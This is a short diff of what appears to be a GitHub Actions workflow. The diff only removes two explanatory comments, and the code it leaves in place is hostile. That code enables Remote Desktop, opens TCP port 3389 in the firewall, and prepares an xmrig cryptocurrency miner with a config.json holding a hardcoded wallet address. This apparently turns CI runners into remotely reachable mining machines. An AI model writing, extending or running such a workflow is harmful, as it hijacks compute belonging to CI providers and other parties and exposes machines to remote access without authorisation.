@@ -11,7 +11,6 @@ jobs:
     steps:
       - name: Configure Core RDP Settings
         run: |
-          # Enable Remote Desktop and configure firewall
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
 
@@ -46,7 +45,6 @@ jobs:
           $minerFolder = (Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
           
           Write-Host "Creating pre-filled config.json with your wallet address..."
-          # This config now includes your hardcoded temporary address.
           $configJson = @"
           {
               "autosave": true,
